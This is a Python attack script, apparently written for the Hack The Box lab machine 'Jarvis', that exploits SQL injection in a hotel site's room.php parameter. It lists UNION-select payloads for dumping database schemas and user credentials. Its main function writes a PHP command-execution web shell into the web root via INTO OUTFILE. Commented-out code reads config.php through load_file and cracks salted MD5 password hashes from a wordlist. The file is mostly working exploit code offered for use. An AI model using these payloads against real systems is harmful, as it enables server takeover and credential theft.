#!/usr/bin/python3

"""
@author Arturo Negreiros
"""



import requests
from pwn import *
from pprint import pprint
from hashlib import md5
import re

MAIN_URL = "http://supersecurehotel.htb/room.php?cod=-1"
SQL_PAYLOADS = {
    "databases":"union select 1,2,schema_name from information_schema.schemata-- -",
    "tables":"union select 1,2, table_name from information_schema.tables where table_schema='database_name'-- -",
    "rows":"union select 1,2,column_name from information_scheme.columns where table_schema='' and table_name=''",
    "rows_information":"union select 1,2,group_concat(username, '0x3a', password) from cmsmsdb.cms_users-- -"
}

def jarvis_sqli():

    try:
        sess = requests.Session()
        ress = sess.get(url=MAIN_URL+" union select 1,'<?php system($_REQUEST[\"cmd\"]); ?>',2,4,5,6,7 into outfile '/var/www/html/arthur.php'-- -")
        
        reg = re.search(r'<span class="price-room">(.*)', ress.text)
        print(reg.group())
        print(ress.text)
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        exit(0)




"""
def enumeration():

    log.progress("performing database enumeration...")
    over_ress = requests.post(url=MAIN_URL+"index.php", 
            cookies={"Cookie":"PHPSESSID=l3iejff9qkdni77spr1cv3vuqe"},
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            # performing a sqli with the table and column name
            # flag    :   one   :   ,players    :   player   :    you are not eligible due to already qualifying. 
            data={"player":"honeyload' union select load_file('/var/www/html/config.php')-- -"})
    
    if over_ress.status_code != 200:
        log.failure("Error in the table enumeration")
        exit(1)
    print(over_ress.text)
    log.success("process was done successfully")



def password_cracker():
    with open(DICT_LIST, "rb") as file:
        for x in file:
            if md5(SALT.encode() + x.strip()).hexdigest() == PASS:
                log.success(f"The password for editor is: {x.strip().decode()}")
                exit(0)
"""


def main():
    
    try:
        jarvis_sqli()
        # enumeration()
        # password_cracker()

    except Exception as e:
        print(str(e))
        exit(1)


    except KeyboardInterrupt:
        log.info("\n\nExiting...\n\n")
        exit(0)




if __name__ == "__main__":
    main()
